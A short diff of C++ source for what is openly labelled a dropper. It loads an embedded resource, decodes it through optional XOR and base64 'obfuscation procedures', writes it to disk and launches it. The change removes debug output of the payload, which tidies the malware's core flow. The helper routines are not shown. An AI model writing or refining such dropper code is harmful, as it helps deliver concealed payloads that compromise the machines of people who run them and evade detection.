@@ -95,9 +95,6 @@ int main(int argc, char* argv[])
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
 
-	std::cout << data << std::endl;
-	std::cout << size << std::endl;
-
 	#if DROPPER_XOR_KEY != 0
 		std::cout << "Xor has been run!\n";
 		data = XOR(data, size);
@@ -107,10 +104,10 @@ int main(int argc, char* argv[])
 		std::cout << "Base64 has been run!\n";
 		data = base64decode(data, &size);
 	#endif
+
 	// where to drop
 	set_name();
 	// Drop to Disk
-	//
 	drop(size, data);
 	// process
 	launch();
